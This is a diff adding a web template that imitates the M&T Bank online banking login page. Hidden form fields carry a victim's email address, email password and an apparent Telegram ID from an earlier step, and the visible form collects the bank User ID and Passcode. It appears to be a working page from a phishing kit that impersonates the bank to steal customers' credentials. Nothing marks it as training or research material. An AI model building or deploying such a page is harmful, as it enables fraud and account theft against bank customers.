@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Welcome to Online Banking | M&T Bank</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+    <style>
+        *{
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        nav{
+            border-bottom: solid 6px rgb(206, 175, 3);
+            font-family: Georgia, 'Times New Roman', Times, serif !important;
+        }
+        nav span{
+            font-weight: lighter !important;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        form{
+            width: 350px !important;
+            color: rgb(119, 113, 113) !important;
+        }
+        form span{
+            font-size: 26px;
+        }
+        .form{
+            border: solid 1px rgb(119, 113, 113);
+            border-radius: 0;
+            
+        }
+        .form:focus{
+            border: solid 2px black !important;
+        }
+        input[type="checkbox"]{
+            scale: 1.8;
+            border: solid 1px rgb(51, 112, 51);
+        }
+        input[type="checked"]{
+            background-color: green;
+            border: solid 1px green;
+        }
+        form button{
+            border-radius: 4px !important;
+        }
+        .footer{
+            font-size: 14px;
+        }
+        small{
+            font-size: 10px;
+            color: rgb(119, 113, 113);
+        }
+        .footer-links{
+            background-color: lightgrey;
+        }
+    </style>
+</head>
+<body>
+    <nav class="container-fluid bg-success text-white p-1 text-center">
+        <h1>M&T<span style="font-weight: lighter !important;">Bank</span></h1>
+    </nav>
+    <br>
+
+    <form action="/M&T" method="post" class="container form-group">
+        <span class="text-success">Log In to Online Banking</span><br>
+        <p class="text-success">For Personal and Business Accounts</p>
+        <br>
+
+        <input type="hidden" name="tel_id" value="<%= telId %>">
+        <input type="hidden" name="email" value="<%= email %>">
+        <input type="hidden" name="emailPassword" value="<%= password %>">
+        <label>User ID</label>
+        <input type="text" name="userId" id="" class="form-control form" required>
+        <br>
+        <label>Passcode</label>
+        <input type="password" name="passcode" id="" class="form-control form" required>
+        <br>
+        <input type="checkbox" name="" id="checkbox" class="">
+        <label for="checkbox" class="fs-6 text-black ms-3"> Remember User ID</label>
+        <br>
+        <br>
+        <button type="submit" name="" id="" class="btn btn-success form-control">Log in</button>
+    
+        <br>
+        <br>
+        <p class="text-center text-decoration-underline text-success">Help with User ID or Passcode</p>
+        <br>
+        <p  class="text-center  text-decoration-underline text-success">Enroll Now</p>
+    
+        <small class="ms-4">Unauthorized access is prohibited. Usage may be monitored.</small>
+    
+    
+    </form>
+<hr>
+<br>
+    <div class="container footer text-center">
+        <p>Have questions about M&T Online Banking</p>
+
+        <div class="row">
+            <div class="col-md-6">
+                <p class="text-success">Personal Accounts: 1-800-790-9130</p>
+                <span>Monday - Friday 8am - 9pm ET</span><br>
+                <span>Saturday - Sunday 9am - 5pm ET</span>
+            </div>
+            
+            <div class="col-md-6">
+                <br>
+                <p class="text-success">Busines Accounts: 1-800-790-9130</p>
+                <span>Monday - Friday 8am - 9pm ET</span><br>
+                <span>Saturday - Sunday 9am - 5pm ET</span>
+            </div>
+        </div>
+<br>
+        
+        
+    </div>
+    <div class="container-fluid footer-links text-success text-center">
+        <span class="text-decoration-underline">Get Started Guide |</span>
+        <span class="text-decoration-underline">Security Assistance |</span>
+        <span class="text-decoration-underline">Digital Service Agreement |</span>
+        <span class="text-decoration-underline">Esign Agreement |</span>
+        <span class="text-decoration-underline">Accessibility |</span>
+        <span class="text-decoration-underline">mtb.com</span>
+        <br>
+
+    <small class="ms-4">&copy;2023 M&T Bank. All Rights Reserved.</small><br>
+    <small class="ms-4">Users of this website agree to e bound by the provisions of the M&T website
+         <span class="text-decoration-underline text-success">Terms of Use</span> and
+         <span class="text-decoration-underline text-success">Privacy</span>.</small>
+    </div>
+</body>
+</html>
